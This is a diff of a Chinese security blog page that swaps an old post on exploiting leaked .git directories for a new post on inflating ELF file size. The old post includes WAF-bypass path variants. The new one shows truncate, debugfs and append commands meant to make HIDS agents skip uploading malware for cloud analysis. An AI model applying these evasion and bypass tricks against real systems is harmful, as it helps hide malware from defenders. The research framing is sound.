-<p>实际的案例可以见 <a target="_blank" rel="noopener" href="https://github.com/fun1355/Papers-1/blob/master/PVE-2015080201.md">百姓某处信息泄露可GET SHELL</a></p>
-<p>个人体会：对于企业内部业务的源码做代码审计来挖掘漏洞，难度比挖”成熟的框架、组件”容易太多了，都不需要攻击者掌握多少代码审计中的偏门技巧等。比如源码中非常可能就有api认证用的token，拿着token就能像也业务方一样调用api。</p>
-<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><ul>
-<li><p>为啥会出现”.git目录信息泄漏”？</p>
-<p>根据个人有限的经验来看，很多公司都会建设devops平台，开发只需要在平台上提交上线单，就可以自动地拉取代码、编译构建、保存版本、发布部署。</p>
-<p>在”拉取代码”这一环节，devops平台从内部git平台上获取源码，其中就包括”.git目录”。</p>
-<p>在php、python等非编译语言的项目构建过程中，非常有可能就是简单地将整个项目全部拷贝到”产出目录”中，此时”.git目录”也会跟着被拷贝过去。</p>
-<p>等到了”发布部署”环节，”.git目录”自然就会出现在线上了。</p>
-</li>
-<li><p>利用”.git目录信息泄漏”还原”项目工程”时遇到的问题</p>
-<p>偶尔会遇到的一个问题是：不一定能访问”.git/index”就一定能用工具还原出整个项目。</p>
-<p>这个原因之前没有深究过，有可能是”.git/objects”目录下的文件无法访问。</p>
-<p>遇到这种情况时，还可以：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* .git&#x2F;index中包含了所有的文件名，可以直接访问文件名对应的url。比如暴露出的js文件，可以直接下载后找api信息。</span><br><span class="line">* .git&#x2F;config中包含了配置信息</span><br><span class="line">* 尝试手动下载 .git&#x2F;objects 目录下的 &quot;项目工程&quot;文件</span><br></pre></td></tr></table></figure>
-
-<p>另外更常见的问题是会遇到防火墙。这个时候可以试试 <code>.git/./index</code> 、 <code>.git///index</code> 、<code>/?/../.git/index</code>、<code>/%3f/../.git/index</code> 等</p>
-</li>
-</ul>
-<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p>漏洞（包括类似”git目录”等信息泄漏）均已提交并修复，包括并不限于：</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>了解hids的读者应该知道hids agent会有上报很多信息，其中有的agent会将可疑文件上报到云端做恶意分析。</p>
+<p>同事问我一个问题：文件如果特别大，也会被上报吗？不会影响性能吗？</p>
+<p>这个问题让我联想到 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么（三）</a> 中大包绕过waf的场景，接着很容易想到：如果agent碰到大文件就不上传了，不就很容易绕过云端的恶意分析了嘛。</p>
+<p>另外，一个恶意文件如果体积过大，可能对安全研究人员做”样本分析”造成一些困难，比如无法将文件下载到本地电脑（网速、磁盘空间可能不够）、ida等静态分析软件内存占用过大。</p>
+<p>基于以上”安全攻防”的业务场景，加上我最近在学习一些操作系统相关的知识，所以就研究下”怎么让elf文件变大”。</p>
+<p>文件变大的同时，还要满足以下条件：</p>
 <ul>
-<li>[评级严重-360游戏]</li>
-<li>两个 [评级低危-腾讯]</li>
-<li>两个 [评级中危-腾讯]</li>
+<li>不影响elf文件执行</li>
+<li>从实用角度来说，攻击队也不会生成一个大文件，然后上传到目标。最好是上传一个小文件，上传到目标机器，然后本地让文件变大。</li>
 </ul>
-<p>2021年了，感觉 “.git目录”这种信息泄漏少见了很多。</p>
-<h1 id="安全建设"><a href="#安全建设" class="headerlink" title="安全建设"></a>安全建设</h1><p>对于”.git等文件信息泄漏”和”代码安全”，这两类风险，在企业安全建设中是怎么防范的呢？</p>
+<p>先说结论，有以下方式让”文件大小”变大：</p>
 <ul>
-<li><p>怎么减少”.git等文件信息泄漏”安全风险？</p>
-<p>其实不仅仅是 “.git/index”，还包括”.svn/entries”、”网站源码.tar.gz” 等文件都有可能暴露在公网给人下载，继而泄漏项目源码。</p>
-<p>根据个人有限的经验来总结，有以下方式减少风险：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 在devops平台做检查，比如&quot;发布部署&quot;前，检查当前产出目录下是否有敏感文件</span><br><span class="line">* 在waf中添加规则，来防护&quot;敏感文件泄漏&quot;</span><br><span class="line">* 周期性扫描</span><br><span class="line">* 依赖开发的安全意识，在&quot;编译构建&quot;时将&quot;.git目录&quot;等敏感文件删除</span><br></pre></td></tr></table></figure>
+<li>文件末尾追加数据</li>
+<li>稀疏文件</li>
+<li>修改inode元数据</li>
+<li>向elf文件节中填充垃圾数据</li>
+</ul>
+<p>说明一下测试环境：测试程序是id命令，复制到了/tmp/y目录下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# \cp &#x2F;usr&#x2F;bin&#x2F;id &#x2F;tmp&#x2F;y</span><br></pre></td></tr></table></figure>
 
-<p>感觉资产覆盖到位，确实能消灭这种风险。</p>
-</li>
-<li><p>怎么减少”代码安全”安全风险？</p>
-<p>根据个人有限的经验来总结，有以下方式减少风险：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 建设白盒扫描，嵌入到devpops流程中</span><br><span class="line">* 安全部门提供安全sdk、安全编码规范</span><br><span class="line">* 其他不限于&quot;代码安全&quot;的应用安全产品，包括 rasp、黑盒扫描</span><br><span class="line">* 依赖开发的安全意识和安全编码水平</span><br><span class="line">* fuzz平台，类似[oss-fuzz](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz)</span><br></pre></td></tr></table></figure>
-
-<p>个人感觉，由于 技术难度、有些场景安全技术无法解决、运营上要求非常低的误报 等原因，即使手段这么多，但是风险太难完全消除了。</p>
+<h1 id="文件末尾追加数据"><a href="#文件末尾追加数据" class="headerlink" title="文件末尾追加数据"></a>文件末尾追加数据</h1><ul>
+<li><p>怎么实现？</p>
+<p>这种方式实现很简单，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# echo 1111 &gt;&gt; .&#x2F;id</span><br><span class="line">[root@instance-fj5pftdp y]# .&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+<p>关键是这样修改后的文件，还能正常执行。</p>
 </li>
 </ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>“.git”目录信息泄漏 + 人工代码审计 这个套路 现在感觉行不太通。</p>
-<p>另外有一个小问题：有师傅知道企业安全建设中怎么用威胁情报来拉黑ip的话，请公众号留言告诉我。</p>
+<h1 id="稀疏文件"><a href="#稀疏文件" class="headerlink" title="稀疏文件"></a>稀疏文件</h1><ul>
+<li><p>“稀疏文件”是什么？</p>
+<p>“稀疏文件”的”文件大小”和实际占用磁盘空间是不一致的，比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   6 20:03 id</span><br><span class="line">[root@instance-fj5pftdp y]# du -sh id</span><br><span class="line">40K	id</span><br></pre></td></tr></table></figure>
+<p>从上面命令可以看到：”文件大小”是10T，但实际数据只占用40K的磁盘大小。</p>
+<p>对于原理感兴趣的读者，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bLiqURdK_dtgr0GqU7yD9w">深度剖析 Linux cp 的秘密</a> 这篇文章。</p>
+</li>
+<li><p>怎么修改成”稀疏文件”？</p>
+<p>可以利用fallocate、truncate命令。</p>
+<p>使用起来也很简单，以truncate举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ls -alh id</span><br><span class="line">-rwxr-xr-x 1 root root 37K 9月   5 20:18 id</span><br><span class="line">[root@instance-fj5pftdp y]# time truncate -s 10T id   &#x2F;&#x2F; 将id程序稀疏成10T大小</span><br><span class="line"></span><br><span class="line">real	0m0.007s</span><br><span class="line">user	0m0.000s</span><br><span class="line">sys	0m0.007s</span><br><span class="line">[root@instance-fj5pftdp y]# ls -alh id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   5 20:02 id    &#x2F;&#x2F; 文件大小已经变成10T</span><br><span class="line">[root@instance-fj5pftdp y]# .&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+
+<p>这种方式修改文件有两个特点：</p>
+<blockquote>
+<p>文件改动非常快，上面的例子中将id文件大小扩大到”10T”只用了1s不到</p>
+<p>文件大小最大可以是10T以上，但不需要本地磁盘空间真的有10T</p>
+</blockquote>
+<p>当你想下载或者读这个文件(比如<code>cat</code>)时，却是会有实实在在的<code>10T</code>流量。10T流量，按照”10M/s”的速度下载，也需要下载291个小时。</p>
+</li>
+</ul>
+<h1 id="修改inode元数据"><a href="#修改inode元数据" class="headerlink" title="修改inode元数据"></a>修改inode元数据</h1><ul>
+<li><p>为什么修改”inode元数据”就可以修改文件大小信息？</p>
+<p>inode元数据包含了文件大小信息，而inode元数据也是存储在磁盘扇区中的，所以应该可以通过修改inode元数据来”伪造”文件大小。</p>
+<p>其实不光大小信息，inode元数据中还包括 文件是否删除、创建时间、修改时间、访问时间 等信息，所以这些都可以被伪造。</p>
+<p>可以通过stat命令查看inode元数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# stat id</span><br><span class="line">  文件：&quot;id&quot;</span><br><span class="line">  大小：37400     	块：80         IO 块：4096   普通文件</span><br><span class="line">设备：fd01h&#x2F;64769d	Inode：171252      硬链接：1</span><br><span class="line">权限：(0755&#x2F;-rwxr-xr-x)  Uid：(    0&#x2F;    root)   Gid：(    0&#x2F;    root)</span><br><span class="line">最近访问：2021-09-06 20:27:26.224913458 +0800</span><br><span class="line">最近更改：2021-09-06 20:27:26.218913032 +0800</span><br><span class="line">最近改动：2021-09-06 20:27:26.224913458 +0800</span><br><span class="line">创建时间：-</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么修改”inode元数据”？</p>
+<p>利用debugfs命令，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# debugfs -w &#x2F;dev&#x2F;vda1</span><br><span class="line">debugfs:  mi &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">                          Mode    [0100755]</span><br><span class="line">                       User ID    [0]</span><br><span class="line">                      Group ID    [0]</span><br><span class="line">                          Size    [37400] 100000      &#x2F;&#x2F; 这里修改文件大小为100000</span><br><span class="line">                 Creation time    [1630929039]</span><br><span class="line">             ...</span><br><span class="line">debugfs:  quit</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">-rwxr-xr-x 1 root root 37400 9月   6 19:50 &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches   &#x2F;&#x2F; 清理inode缓存后，修改才生效</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">-rwxr-xr-x 1 root root 100000 9月   6 19:50 &#x2F;tmp&#x2F;y&#x2F;id    &#x2F;&#x2F; 文件大小变成了100000</span><br><span class="line">[root@instance-fj5pftdp ~]# &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+
+<p>在测试过程中，需要读者注意的是：</p>
+<blockquote>
+<p>因为会对磁盘数据做写操作，所以最好找一个没数据的机器做测试</p>
+<p>记得清理inode缓存</p>
+<p>测试时如果使用文件当作设备，在挂载文件系统时去修改文件大小 会不生效。原因未知</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="向elf文件节中添加垃圾数据"><a href="#向elf文件节中添加垃圾数据" class="headerlink" title="向elf文件节中添加垃圾数据"></a>向elf文件节中添加垃圾数据</h1><ul>
+<li><p>是什么？</p>
+<p>elf文件中包含很多的<em>节</em>，比如：</p>
+<blockquote>
+<p>.text存放代码</p>
+<p>.data存放初始化的全局变量和静态变量</p>
+</blockquote>
+<p>关于elf的文件格式，更多信息可以参考 《程序员的自我修养—链接、装载与库》第三章 elf文件结构描述。</p>
+<p>可以向elf的节（比如.data、.text、.bss等）中写入垃圾数据，而不影响程序的正常运行。</p>
+</li>
+</ul>
+<p>  这种方式和其他三种方式的区别在于：因为可以删掉没用的节，所以就很容易就把”其他三种方式”修改的elf给还原回来。</p>
+<p>  比如strip后，文件大小就还原了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   6 20:03 id</span><br><span class="line">[root@instance-fj5pftdp y]# strip id</span><br><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 37K 9月   6 20:27 id</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>怎么”向elf文件节中添加垃圾数据”？</p>
+<p>没有找到linux自带的命令，找到 <a target="_blank" rel="noopener" href="https://firmianay.gitbook.io/ctf-all-in-one/3_topics/reverse/3.2.1_patch_binary#patchkit">patch elf工具-patchkit</a>。</p>
+<p>看文档感觉有点麻烦，就没有做测试了。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>“文件末尾追加数据”和”向elf文件节中填充垃圾数据”这两种方式是真的修改了文件内容，所以受限于磁盘空间大小也不可能生成几个T大小的文件。</p>
+<p>“稀疏文件”这种方式，可以方便快速地生成几个T大小的文件，并且让上传、下载此文件 耗费很多时间，甚至是不可能成功。</p>
+<p>“修改inode元数据”，虽然也可以快速地将文件大小修改为几个T，但是并不会让上传、下载此文件 耗费很多时间，传输的文件大小还是实际大小。</p>
+<p>如果应急时碰到超大的elf文件，就先用strip看看体积会不会变小。</p>
+<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎有对抗经验的读者与我交流。</p>
 
       
     </div>
